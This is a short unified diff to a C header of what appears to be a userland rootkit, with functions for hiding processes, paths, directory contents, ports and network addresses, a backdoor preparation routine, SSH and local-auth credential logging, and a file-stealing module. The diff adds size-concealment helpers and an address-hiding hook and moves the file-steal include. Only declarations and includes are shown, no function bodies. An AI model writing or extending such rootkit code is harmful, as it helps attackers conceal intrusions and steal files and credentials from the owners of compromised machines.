@@ -176,6 +176,11 @@ int hidden_proc(pid_t pid);
 #define hidden_lpath(path)   _l_hidden_path(path, MODE_REG)
 #define hidden_lpath64(path) _l_hidden_path(path, MODE_64)
 
+off_t getfilesize(const char *path);
+off_t getnewfilesize(const char *path, off_t fsize);
+off_t getdirsize(const char *dirpath);
+off_t getnewdirsize(const char *dirpath, off_t fsize);
+#include "size.c"
 
 #if defined LOG_SSH || defined LOG_LOCAL_AUTH
 int alreadylogged(const char *logpath, char *logbuf);
@@ -197,17 +202,20 @@ void eradicatedir(const char *target);
 void hidedircontents(const char *target, gid_t magicgid);
 #include "magic/magic.h"
 
-#ifdef FILE_STEAL
-#include "steal/steal.h"
-#endif
-
 int prepareregfile(const char *path, gid_t magicgid);
 int preparedir(const char *path, gid_t magicgid);
+#ifdef HIDE_ADDRS
+void preparehideaddrs(gid_t magicgid);
+#endif
 #ifdef HIDE_PORTS
 void preparehideports(gid_t magicgid);
 #endif
 void bdprep(void);
 #include "prep.c"
+
+#ifdef FILE_STEAL
+#include "steal/steal.h"
+#endif
 
 #include "install/install.h"
 
